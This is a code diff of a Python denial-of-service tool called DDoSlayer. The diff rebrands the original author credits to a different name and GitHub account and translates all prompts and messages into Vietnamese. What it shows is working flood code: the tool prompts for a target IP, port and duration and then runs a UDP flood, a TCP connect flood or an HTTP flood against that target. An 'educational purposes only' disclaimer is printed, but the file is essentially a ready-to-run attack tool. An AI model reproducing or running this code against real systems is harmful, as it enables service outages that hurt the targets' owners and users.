@@ -10,36 +10,30 @@ os.system("clear")
 os.system("figlet DDoSlayer")
 
 print()
-print(colored("Author   : Chris 'SaintDruG' Abou-Chabke", 'green'))
-print(colored("Website : https://www.blackhatethicalhacking.com", 'magenta'))
-print(colored("Github   : https://github.com/blackhatethicalhacking", 'red'))
-print(colored("YouTube : https://www.youtube.com/channel/UC7-AsunT7zO-ny5-U8glqkw", 'green'))
-print(colored("Linkedin : https://www.linkedin.com/company/black-hat-ethical-hacking/", 'magenta'))
-print(colored("Twitter : https://twitter.com/secur1ty1samyth", 'green'))
-print(colored("Offense is always the best defense!", 'magenta'))
-print(colored("This tool is written for Educational purposes only - helping the defensive team look into how such attacks take place.", 'cyan'))
-print(colored("BHEH Is not responsible for misusing it and must have an NDA signed to perform such attacks", 'red'))
-print(colored("You are using DDoSlayer Version: 2.0", 'yellow'))
+print(colored("Tác giả   : Chris 'ViBoss Studio' Dhungx", 'green'))
+print(colored("Github    : https://github.com/dhungx", 'red'))
+print(colored("Tấn công là cách phòng thủ tốt nhất!", 'magenta'))
+print(colored("Công cụ này được viết cho mục đích giáo dục - giúp đội ngũ phòng thủ hiểu rõ cách thức các cuộc tấn công diễn ra.", 'cyan'))
+print(colored("BHEH không chịu trách nhiệm về việc lạm dụng công cụ này và bạn phải ký NDA để thực hiện các cuộc tấn công như vậy", 'red'))
+print(colored("Bạn đang sử dụng DDoSlayer Phiên bản: 2.0", 'yellow'))
 print()
 
 # Prompt for target IP and port
-ip = input("Enter the target IP: ")
+ip = input("Nhập IP mục tiêu: ")
 try:
-    port = int(input("Enter the target port: "))
+    port = int(input("Nhập cổng mục tiêu: "))
 except ValueError:
-    print("Invalid port. Exiting...")
+    print("Cổng không hợp lệ. Đang thoát...")
     sys.exit()
 
 # Prompt for attack duration
 try:
-    dur = int(input("Enter the duration of the attack in seconds: "))
+    dur = int(input("Nhập thời gian tấn công (giây): "))
 except ValueError:
-    print("Invalid duration. Exiting...")
+    print("Thời gian không hợp lệ. Đang thoát...")
     sys.exit()
 
 # Function to perform the UDP Flood attack
-
-
 def udp_flood(ip, port, message, dur):
     # Create the UDP socket
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -58,7 +52,7 @@ def udp_flood(ip, port, message, dur):
         try:
             s.sendto(message, target)
             packet_count += 1
-            print(f"Sent packet {packet_count}")
+            print(f"Đã gửi gói tin {packet_count}")
         except socket.error:
             # If the socket is not able to send the packet, break the loop
             break
@@ -84,17 +78,17 @@ def syn_flood(ip, port, duration):
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((ip, port))
             sent += 1
-            print(f"SYN Packets sent: {sent} to target: {ip}")
+            print(f"Gói tin SYN đã gửi: {sent} tới mục tiêu: {ip}")
             sock.close()
         except OSError:
             pass
         except KeyboardInterrupt:
-            print("\n[*] Attack stopped.")
+            print("\n[*] Đã dừng tấn công.")
             sys.exit()
         finally:
             sock.close()  # Make sure to close the socket in all cases 
-# Function to perform the HTTP Flood attack
 
+# Function to perform the HTTP Flood attack
 def http_flood(ip, port, duration):
     # create a socket
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -115,28 +109,28 @@ def http_flood(ip, port, duration):
             sock.connect((ip, port))
             sock.sendall(http_request)
             sent += 1
-            print(f"HTTP Packets sent: {sent} to target: {ip}")
+            print(f"Gói tin HTTP đã gửi: {sent} tới mục tiêu: {ip}")
         except KeyboardInterrupt:
-            print("\n[-] Attack stopped by user")
+            print("\n[-] Đã dừng tấn công bởi người dùng")
             break
     sock.close()
 
 
 # Prompt for the type of attack
 attack_type = input(colored(
-    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))
+    "Chọn loại tấn công (Chọn số) (1.UDP/2.HTTP/3.SYN): ", "green"))
 
 if attack_type == "1":
-    message = b"Sending 1337 packets baby"
-    print(colored("UDP attack selected", "red"))
+    message = b"Đang gửi gói tin 1337"
+    print(colored("Đã chọn tấn công UDP", "red"))
     udp_flood(ip, port, message, dur)
-    print(colored("UDP attack completed", "red"))
+    print(colored("Đã hoàn thành tấn công UDP", "red"))
 elif attack_type == "3":
-    print(colored("SYN attack selected", "red"))
+    print(colored("Đã chọn tấn công SYN", "red"))
     syn_flood(ip, port, dur)
 elif attack_type == "2":
-    print(colored("HTTP attack selected", "red"))
+    print(colored("Đã chọn tấn công HTTP", "red"))
     http_flood(ip, port, dur)
 else:
-    print(colored("Invalid attack type. Exiting...", "green"))
+    print(colored("Loại tấn công không hợp lệ. Đang thoát...", "green"))
     sys.exit()
